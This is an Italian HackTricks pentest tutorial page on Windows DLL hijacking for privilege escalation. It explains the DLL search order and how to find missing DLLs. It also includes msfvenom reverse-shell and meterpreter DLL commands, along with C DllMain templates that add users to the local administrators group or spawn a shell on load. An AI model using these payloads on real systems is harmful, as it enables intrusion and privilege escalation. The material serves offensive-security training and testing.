# Dll Hijacking

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repository di GitHub.**

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se sei interessato a una **carriera nell'hacking** e vuoi hackerare l'impossibile - **stiamo assumendo!** (_richiesta di scrittura e parlato fluenti in polacco_).

{% embed url="https://www.stmcyber.com/careers" %}

## Informazioni di base

Il DLL Hijacking consiste nella manipolazione di un'applicazione fidata per caricare un DLL dannoso. Questo termine comprende diverse tattiche come **DLL Spoofing, Injection e Side-Loading**. Viene principalmente utilizzato per l'esecuzione del codice, il raggiungimento della persistenza e, meno comunemente, l'escalation dei privilegi. Nonostante l'attenzione sull'escalation qui, il metodo di hijacking rimane coerente in tutti gli obiettivi.

### Tecniche comuni

Vengono utilizzati diversi metodi per il DLL hijacking, ognuno con la sua efficacia a seconda della strategia di caricamento DLL dell'applicazione:

1. **Sostituzione del DLL**: Sostituzione di un DLL genuino con uno dannoso, eventualmente utilizzando il DLL Proxying per preservare la funzionalità del DLL originale.
2. **DLL Search Order Hijacking**: Posizionamento del DLL dannoso in un percorso di ricerca prima di quello legittimo, sfruttando il modello di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: Creazione di un DLL dannoso per farlo caricare da un'applicazione, pensando che sia un DLL richiesto inesistente.
4. **DLL Redirection**: Modifica dei parametri di ricerca come `%PATH%` o dei file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione al DLL dannoso.
5. **DLL Replacement di WinSxS**: Sostituzione del DLL legittimo con una controparte dannosa nella directory WinSxS, un metodo spesso associato al side-loading del DLL.
6. **DLL Hijacking con percorso relativo**: Posizionamento del DLL dannoso in una directory controllata dall'utente con l'applicazione copiata, simile alle tecniche di esecuzione di Binary Proxy.

## Trovare Dll mancanti

Il modo più comune per trovare Dll mancanti all'interno di un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) da sysinternals, **impostando** i **seguenti 2 filtri**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

e mostrare solo l'**attività del file system**:

![](<../../.gitbook/assets/image (314).png>)

Se stai cercando **Dll mancanti in generale**, lascia che questo venga eseguito per alcuni **secondi**.\
Se stai cercando un **Dll mancante all'interno di un eseguibile specifico**, dovresti impostare **un altro filtro come "Nome processo" "contiene" "\<nome eseguibile>", eseguirlo e interrompere la cattura degli eventi**.

## Sfruttare i Dll mancanti

Per elevare i privilegi, la migliore possibilità che abbiamo è quella di essere in grado di **scrivere un dll che un processo con privilegi proverà a caricare** in qualche **posizione in cui verrà cercato**. Pertanto, saremo in grado di **scrivere** un dll in una **cartella** in cui il **dll viene cercato prima** della cartella in cui si trova il **dll originale** (caso strano), oppure saremo in grado di **scrivere in una cartella in cui il dll verrà cercato** e il **dll originale non esiste** in nessuna cartella.

### Ordine di ricerca dei Dll

**All'interno della** [**documentazione di Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come vengono caricati specificamente i Dll.**

Le applicazioni **Windows** cercano i DLL seguendo un insieme di **percorsi di ricerca predefiniti**, conformi a una sequenza particolare. Il problema del DLL hijacking sorge quando un DLL dannoso viene strategicamente posizionato in una di queste directory, garantendo che venga caricato prima del DLL autentico. Una soluzione per prevenire ciò è assicurarsi che l'applicazione utilizzi percorsi assoluti quando si fa riferimento ai DLL necessari.

Puoi vedere l'**ordine di ricerca dei DLL su sistemi a 32 bit** di seguito:

1. La directory da cui è stata caricata l'applicazione.
2. La directory di sistema. Utilizzare la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il percorso di questa directory. (_C:\Windows\System32_)
3. La directory di sistema a 16 bit. Non esiste una funzione che ottiene il percorso di questa directory, ma viene comunque cercata. (_C:\Windows\System_)
4. La directory di Windows. Utilizzare la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il percorso di questa directory.
1. (_C:\Windows_)
5. La directory corrente.
6. Le directory elencate nella variabile di ambiente PATH. Nota che ciò non include il percorso specificato dall'**App Paths** nel registro. La chiave **App Paths** non viene utilizzata durante il calcolo del percorso di ricerca dei DLL.

Questo è l'**ordine di ricerca predefinito** con **SafeDllSearchMode** abilitato. Quando è disabilitato, la directory corrente sale al secondo posto. Per disabilitare questa funzionalità, crea il valore del registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo su 0 (il valore predefinito è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **un dll potrebbe essere caricato indicando il percorso assoluto invece del solo nome**. In quel caso, quel dll verrà **ricercato solo in quel percorso** (se il dll ha dipendenze, verranno cercate come appena caricate per nome).

Ci sono altri modi per alterare l'ordine di ricerca, ma non li spiegherò qui.
#### Eccezioni sull'ordine di ricerca delle DLL dalla documentazione di Windows

Alcune eccezioni all'ordine di ricerca standard delle DLL sono indicate nella documentazione di Windows:

- Quando viene incontrata una **DLL che condivide il suo nome con una già caricata in memoria**, il sistema salta la ricerca usuale. Invece, esegue un controllo per la ridirezione e un manifesto prima di utilizzare la DLL già in memoria. **In questo scenario, il sistema non effettua una ricerca per la DLL**.
- Nei casi in cui la DLL viene riconosciuta come una **DLL conosciuta** per la versione corrente di Windows, il sistema utilizzerà la sua versione della DLL conosciuta, insieme a tutte le DLL dipendenti, **evitando il processo di ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene un elenco di queste DLL conosciute.
- Se una DLL ha **dipendenze**, la ricerca di queste DLL dipendenti viene effettuata come se fossero indicate solo dai **nomi dei moduli**, indipendentemente dal fatto che la DLL iniziale sia stata identificata tramite un percorso completo.


### Escalatione dei privilegi

**Requisiti**:

- Identificare un processo che opera o opererà con **privilegi diversi** (movimento orizzontale o laterale), che **manca di una DLL**.
- Assicurarsi che sia disponibile l'**accesso in scrittura** per qualsiasi **directory** in cui verrà **ricercata la DLL**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory all'interno del percorso di sistema.

Sì, i requisiti sono complicati da trovare poiché **di default è strano trovare un eseguibile privilegiato che manca di una DLL** ed è ancora **più strano avere le autorizzazioni di scrittura su una cartella del percorso di sistema** (di default non è possibile). Ma, in ambienti configurati in modo errato, ciò è possibile.\
Nel caso in cui siate fortunati e vi troviate a soddisfare i requisiti, potreste controllare il progetto [UACME](https://github.com/hfiref0x/UACME). Anche se l'**obiettivo principale del progetto è bypassare UAC**, potreste trovare lì un **PoC** di un attacco di hijacking di DLL per la versione di Windows che potete utilizzare (probabilmente cambiando il percorso della cartella in cui avete le autorizzazioni di scrittura).

Si noti che è possibile **verificare le proprie autorizzazioni in una cartella** eseguendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **controlla le autorizzazioni di tutte le cartelle all'interno del percorso**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare gli import di un eseguibile e le esportazioni di una dll con:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abusare del Dll Hijacking per elevare i privilegi** con le autorizzazioni per scrivere in una cartella **System Path**, controlla:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Strumenti automatizzati

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificherà se hai le autorizzazioni di scrittura su qualsiasi cartella all'interno del sistema PATH.\
Altri strumenti automatizzati interessanti per scoprire questa vulnerabilità sono le funzioni di **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll_.

### Esempio

Nel caso in cui trovi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo sarebbe creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa. Tuttavia, nota che il Dll Hijacking è utile per [elevare il livello di integrità da Medio a Alto **(bypassando UAC)**](../authentication-credentials-uac-and-efs.md#uac) o da [**Alto a SYSTEM**](./#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una dll valida** all'interno di questo studio sul dll hijacking focalizzato sul dll hijacking per l'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiva** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **modelli** o per creare una **dll con funzioni non richieste esportate**.

## **Creazione e compilazione di Dlls**

### **Dll Proxifying**

Fondamentalmente, un **Dll proxy** è un Dll in grado di **eseguire il tuo codice maligno quando viene caricato**, ma anche di **esporre** e **funzionare** come **previsto**, **inoltrando tutte le chiamate alla libreria reale**.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** che desideri proxificare e **generare una dll proxificata** o **indicare la Dll** e **generare una dll proxificata**.

### **Meterpreter**

**Ottieni una shell inversa (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Creare un utente (non ho visto una versione x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Il tuo

Nota che in diversi casi la Dll che compili deve **esportare diverse funzioni** che verranno caricate dal processo vittima, se queste funzioni non esistono il **binario non sarà in grado di caricarle** e l'**exploit fallirà**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Riferimenti
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se sei interessato a una **carriera di hacking** e a hackerare l'impossibile - **stiamo assumendo!** (_richiesta competenza fluente in polacco, scritta e parlata_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
